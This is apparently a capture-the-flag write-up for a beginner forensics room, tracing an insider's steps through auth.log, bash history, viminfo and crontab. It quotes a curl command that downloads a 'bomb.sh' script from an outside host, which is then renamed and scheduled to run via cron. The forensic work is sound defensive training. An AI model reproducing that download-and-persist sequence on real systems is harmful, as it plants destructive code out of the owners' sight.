# Disgruntled

## Challenge Information
- **Challenge Name**: Disgruntled
- **Category**: Forensics
- **Difficulty Level**: Easy

## Task-1
1. Read the task carefully. Grab the Cup of Coffee and get ready to start ! :)

## Task-2
1. Review the given document carefully. Take a sip of the Coffee beacuase the journey is about to start! :)

## Task-3
1. To see the logs of the activites performed, the logs are present in the auth.log file where we can add the filter of `sudo` to see the logs for the activites assossiated with the elevated privileges, and `install` to see the logs for only installation. Hence, using the command 
```
cat /var/log/auth.log | grep 'sudo' | grep 'install'
``` 
gives usa result where the command is writtena against the variable `COMMAND` as `/usr/bin/apt install dokuwiki`.

2. In the same result, the current directory is written against `PWD` as `/home/cybert`.

## Task-4
1. Since we have to figure out the creation of user, the command in the linux used to create a new user starts with `adduser`. So now lets read the log file with this filter, using the command 
```
cat /var/log/auth.log | grep 'sudo'
```
This will give us the newly created user `it-admin`.

2. When editing the sudoers file, the command starts with `visudo`. So lets jsut add this keyword now, using the command 
```
cat /var/log/auth.log | grep 'visudo'
```
This will give two logs. The log with the user `cybert`, is the required one, with the time `Dec 28 06:27:34`.

3. Since the file was opened using the vi text editor, add this as a filter in the command 
```
cat /var/log/auth.log | grep 'vi'
```
This will give us the command in which the script was opened `bomb.sh`.

## Task-5
1. Now for the logs of the commands, we will read the file `.bash_history` for the user `it-admin`. Run the command 
```
cat /home/it-admin/.bash_history
```
This will show the command that was used to create the file bobm.sh: 
`curl 10.10.158.38:8080/bomb.sh --output bomb.sh`.

2. Since the renaming of the file is concerned when the file was eidted or saved using the editor tool used, we can see the logs of the `.viminfo`. To see the information, run the command 
```
cat /home/it-admin/.viminfo
```
Here in the logs, there is a log containing the information of `saveas`, which contains the new renamed file `/bin/os-update.sh`.

3. To see when this .viminfo file was last updated, we can see the full time using the command 
```
ls -la --full-time /home/it-admin/.viminfo
```
This will give the time `2022-12-28 06:29:52`, which we can right in the required format `Dec 28 06:29`.

4. Since we know the latest path of the new renamed file `/bin/os-update.sh`, we can read its contents to the see the file that will get created. Run the command 
```
cat /bin/os-update.sh
```
Here in the contents of the script, the file can be seen as `goodbye.txt`.

## Task-6
1. The scheduled tasks can be seen in the `crontab` file. Running the command 
```
cat /etc/crontab
```
will give some output in which we can see the scheduling for the malicious script as well. In the starting of the line of that job, we can see the time as `0 8` which refers to the time `08:00 AM`.

## Task-7
1. Click on the acknowledgement and enjoy the Badge!
